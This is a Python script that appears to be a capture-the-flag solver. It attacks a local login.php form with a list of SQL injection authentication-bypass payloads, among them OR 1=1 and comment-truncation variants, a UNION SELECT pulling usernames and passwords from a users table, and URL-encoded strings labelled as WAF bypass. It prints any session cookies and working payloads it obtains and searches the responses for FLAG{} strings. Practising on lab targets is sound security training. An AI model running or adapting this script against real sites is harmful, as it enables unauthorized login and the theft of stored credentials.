import requests
import sys
from urllib.parse import urljoin

# Configure stdout for better buffering
sys.stdout.reconfigure(line_buffering=True)

# Target information
TARGET_URL = "http://127.0.0.1:33167/login.php"
MAX_RESPONSE_PRINT = 500  # Limit response text output

# Initialize session
session = requests.Session()

def send_login_request(username_payload, password="password"):
    """Send login request with given payload and return response details."""
    data = {
        'username': username_payload,
        'password': password
    }
    
    try:
        response = session.post(TARGET_URL, data=data, allow_redirects=False, timeout=10)
        return {
            'payload': username_payload,
            'status_code': response.status_code,
            'response_length': len(response.text),
            'has_session_cookie': 'PHPSESSID' in response.cookies,
            'cookies': dict(response.cookies) if 'PHPSESSID' in response.cookies else {},
            'is_redirect': 300 <= response.status_code < 400,
            'redirect_location': response.headers.get('Location', ''),
            'response_text': response.text,
            'response_time': response.elapsed.total_seconds()
        }
    except Exception as e:
        return {
            'payload': username_payload,
            'error': str(e)
        }

# 1. Establish baseline with failed login
print("[1] ESTABLISHING BASELINE")
print("-" * 60)
baseline_payload = "invalid_user_"
baseline_response = send_login_request(baseline_payload, "wrong_password_123")
print(f"Baseline: {baseline_payload}")
print(f"Status: {baseline_response['status_code']} | Length: {baseline_response['response_length']}B")
print(f"Cookie: {'Yes' if baseline_response['has_session_cookie'] else 'No'}")
print(f"Time: {baseline_response['response_time']:.3f}s")
print()

# 2. Test SQL injection payloads
print("[2] TESTING SQL INJECTION PAYLOADS")
print("-" * 60)

# Core payloads to test (reduced for reliability)
critical_payloads = [
    # Classic OR-based
    ("admin' OR '1'='1'--", "Classic OR-based 1"),
    ("admin' OR 1=1--", "Classic OR-based 2"),
    ("admin' OR 1=1#", "Classic OR-based 3"),
    ("' OR '1'='1'--", "Classic OR-based 4"),
    ("' OR 1=1--", "Classic OR-based 5"),
    
    # Comment-based
    ("admin'--", "Comment-based 1"),
    ("admin'#", "Comment-based 2"),
    ("'--", "Comment-based 3"),
    ("' #", "Comment-based 4"),
    
    # Boolean conditions
    ("admin' AND '1'='1'--", "Boolean AND true"),
    ("admin' AND '1'='2'--", "Boolean AND false"),
    ("admin' OR '1'='2'--", "Boolean OR false"),
    
    # Nested variations
    ("admin' OR ''='", "Nested quotes 1"),
    ("' OR ''='", "Nested quotes 2"),
    ("admin' OR 'a'='a", "Nested quotes 3"),
    
    # Parentheses bypass
    ("admin') OR '1'='1'--", "Parentheses 1"),
    ("') OR '1'='1'--", "Parentheses 2"),
    
    # Alternative comments
    ("admin' OR '1'='1';--", "Semicolon comment"),
    ("admin' OR '1'='1';#", "Semicolon hash"),
    
    # Spaces variations
    ("admin'OR'1'='1'--", "No spaces 1"),
    ("admin'OR 1=1--", "No spaces 2"),
    
    # UNION-based
    ("admin' UNION SELECT 1,2,3--", "Union select"),
    ("' UNION SELECT username,password FROM users--", "Union extract"),
]

# Test payloads
successful_attempts = []
failed_attempts = []
cookie_found = False

print(f"Testing {len(critical_payloads)} payloads...\n")

for i, (payload, description) in enumerate(critical_payloads, 1):
    print(f"[{i:2d}/{len(critical_payloads)}] {description}")
    print(f"      Payload: {payload[:50]}")
    
    result = send_login_request(payload)
    
    if 'error' in result:
        print(f"      ERROR: {result['error']}")
        continue
    
    # Check for success indicators
    indicators = []
    if result['has_session_cookie']:
        indicators.append("COOKIE")
        cookie_found = True
    if result['is_redirect']:
        indicators.append(f"REDIRECT({result['redirect_location']})")
    if result['status_code'] != baseline_response['status_code']:
        indicators.append(f"STATUS_{result['status_code']}")
    
    # Check for welcome/dashboard messages
    lower_text = result['response_text'].lower()
    if any(keyword in lower_text for keyword in ["welcome", "dashboard", "logged in", "logout", "profile"]):
        indicators.append("WELCOME")
    
    # Size difference
    size_diff = result['response_length'] - baseline_response['response_length']
    if abs(size_diff) > 100:
        indicators.append(f"SIZE{size_diff:+d}")
    
    print(f"      Result: Status={result['status_code']} | Length={result['response_length']}B | Time={result['response_time']:.3f}s", end="")
    
    if indicators:
        print(f" | [!] {', '.join(indicators)}")
        if result['has_session_cookie']:
            print(f"      COOKIE: {result['cookies']}")
        successful_attempts.append(result)
    else:
        print()
        failed_attempts.append(result)

# Summary
print("\n" + "="*60)
print("[3] SUMMARY")
print("="*60)
print(f"Total tested: {len(critical_payloads)}")
print(f"Successful: {len(successful_attempts)}")
print(f"Failed: {len(failed_attempts)}")

if successful_attempts:
    print("\n[!] SUCCESSFUL AUTH BYPASS PAYLOADS:")
    for i, success in enumerate(successful_attempts, 1):
        print(f"  [{i}] {success['payload']}")
        print(f"      Status: {success['status_code']} | Cookie: {'Yes' if success['has_session_cookie'] else 'No'}")
        if success['is_redirect']:
            print(f"      Redirect: {success['redirect_location']}")
        if success['has_session_cookie']:
            print(f"      Session: {success['cookies']}")
else:
    print("\n[-] No successful bypass detected with standard payloads")

# 3. Test URL-encoded payloads (WAF bypass)
print("\n" + "="*60)
print("[4] URL-ENCODED PAYLOADS (WAF BYPASS)")
print("="*60)

url_encoded_tests = [
    ("admin%27+OR+%271%27%3D%271%27--", "URL encoded OR 1=1"),
    ("%27+OR+1%3D1--", "URL encoded ' OR 1=1"),
    ("admin%27--", "URL encoded admin'--"),
    ("admin%27%2F%2A+OR+%271%27%3D%271%27+%2A%2F", "Comment bypass"),
]

for payload, desc in url_encoded_tests:
    print(f"\\nTest: {desc}")
    result = send_login_request(payload)
    
    if 'error' not in result:
        indicators = []
        if result['has_session_cookie']:
            indicators.append("COOKIE")
        if result['is_redirect']:
            indicators.append("REDIRECT")
        if result['status_code'] != baseline_response['status_code']:
            indicators.append(f"STATUS_{result['status_code']}")
        
        print(f"  Status: {result['status_code']} | Length: {result['response_length']}B", end="")
        if indicators:
            print(f" | [!] {', '.join(indicators)}")
            if result['has_session_cookie']:
                successful_attempts.append(result)
        else:
            print()

# 4. Flag search
print("\n" + "="*60)
print("[5] SEARCHING FOR FLAGS")
print("="*60)

import re
flag_pattern = re.compile(r'FLAG\\{[^}]+\\}')
flags_found = []

# Check all responses
all_responses = [baseline_response] + successful_attempts + failed_attempts
for resp in all_responses:
    if 'response_text' in resp and 'error' not in resp:
        flags = flag_pattern.findall(resp['response_text'])
        if flags:
            flags_found.extend(flags)

if flags_found:
    print(f"[!] FLAGS FOUND: {len(set(flags_found))}")
    for flag in set(flags_found):
        print(f"  {flag}")
else:
    print("[-] No FLAG{} patterns found")

# 5. Final report
print("\n" + "="*60)
print("[6] FINAL REPORT")
print("="*60)

if successful_attempts:
    print("[CRITICAL] SQL INJECTION AUTH BYPASS: CONFIRMED")
    print(f"Working payloads: {len(successful_attempts)}")
    for i, s in enumerate(successful_attempts[:5], 1):
        print(f"  {i}. {s['payload']}")
else:
    print("[INFO] No authentication bypass confirmed")
    print("Recommendations:")
    print("  - Try time-based blind injection")
    print("  - Test different parameter names")
    print("  - Check for filter/WAF presence")
    print("  - Try double encoding")
    print("  - Test with different HTTP methods")

if cookie_found:
    print("\\n[NOTE] Session cookies detected - login functionality working")
else:
    print("\\n[NOTE] No session cookies detected - check if app uses different mechanism")

